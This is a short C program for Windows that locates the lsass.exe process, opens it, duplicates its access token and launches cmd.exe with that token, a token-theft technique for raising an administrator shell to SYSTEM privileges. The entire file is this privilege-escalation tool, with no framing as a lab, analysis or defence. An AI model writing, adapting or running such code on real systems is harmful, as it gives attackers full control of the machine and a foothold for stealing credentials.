#include <stdio.h>
#include <string.h>
#include <stdbool.h>
#include <Windows.h>
#include <wtsapi32.h>
#include <tlhelp32.h>
#include <winbase.h>

#pragma comment(lib, "WtsApi32.lib")
#pragma comment(lib, "advapi32.lib")


DWORD OpenProcessAsSystem(int pid);
int FindLsass();
LPWSTR GetLastErrorMSG(DWORD dwErrorcode);


int FindLsass() {
    const wchar_t cwcProcess[] = L"lsass.exe";
    //int pid[30] = { 0 };

    // Create toolhelp snapshot.
    HANDLE hSnapshot = CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, 0);
    PROCESSENTRY32 processEntry;
    ZeroMemory(&processEntry, sizeof(processEntry));
    processEntry.dwSize = sizeof(processEntry);

    // Walkthrough all processes.
    int counter = 0;
    if (Process32First(hSnapshot, &processEntry)) {
        do {
            if(wcscmp(processEntry.szExeFile, cwcProcess) == 0){
                // Compare process.szExeFile based on format of name, i.e., trim file path
                // trim .exe if necessary, etc.

                //printf("%d\n", processEntry.th32ProcessID);
                printf("NAME:  [  %ws  ] - ", processEntry.szExeFile);
                OpenProcessAsSystem(processEntry.th32ProcessID);
                return 1;
            }

        } while (Process32Next(hSnapshot, &processEntry));
    }
    return 0;
}


DWORD OpenProcessAsSystem(int pid) {
    CHAR szCmdline[] = "cmd.exe";
    STARTUPINFO si = { 0 };
    PROCESS_INFORMATION pi = { 0 };
    HANDLE hToken, hProcess, hNewProcess;


    //ZeroMemory(&si, sizeof(si));
    ZeroMemory(&hToken, sizeof(hToken));

    si.cb = sizeof(si);
    si.wShowWindow = TRUE;

    hProcess = OpenProcess(MAXIMUM_ALLOWED, FALSE, pid);
    if (hProcess == NULL) {
        DWORD dwErrorcode = GetLastError();
        printf("Open Process: Exited with error code %d - %ws", dwErrorcode, GetLastErrorMSG(dwErrorcode));
        return GetLastError();
    }

    
    if (OpenProcessToken(hProcess, MAXIMUM_ALLOWED, &hToken) == 0) {
        CloseHandle(hProcess);
        DWORD dwErrorcode = GetLastError();
        printf("Open Process Token: Exited with error code %d - %ws", dwErrorcode, GetLastErrorMSG(dwErrorcode));
        return GetLastError();
    }
  

    if (DuplicateTokenEx(hToken, TOKEN_ALL_ACCESS, NULL, SecurityIdentification, TokenPrimary, &hNewProcess) == 0) {
        DWORD dwErrorcode = GetLastError();
        CloseHandle(hProcess);
        CloseHandle(hToken);
        printf("Duplicate Token: Exited with error code %d - %ws", dwErrorcode, GetLastErrorMSG(dwErrorcode));
        return GetLastError();
    }


    if (CreateProcessWithTokenW(hNewProcess, NULL, L"C:\\Windows\\System32\\cmd.exe", NULL, CREATE_NEW_CONSOLE, NULL, L"C:\\Windows\\System32", &si, &pi)) {
        CloseHandle(pi.hThread);
        CloseHandle(pi.hProcess);
    }

    printf("Token Granted successfully\n");
    CloseHandle(hToken);
    CloseHandle(hProcess);
    return 0;
}


LPWSTR GetLastErrorMSG(DWORD dwErrorcode) {
    LPWSTR lpwsErrormsg;
    FormatMessageW(FORMAT_MESSAGE_IGNORE_INSERTS | FORMAT_MESSAGE_FROM_SYSTEM | FORMAT_MESSAGE_ALLOCATE_BUFFER, NULL, dwErrorcode, MAKELANGID(LANG_NEUTRAL, SUBLANG_DEFAULT), (LPWSTR)&lpwsErrormsg, 200, NULL);
    return lpwsErrormsg;
}


void main() {

    FindLsass();
}
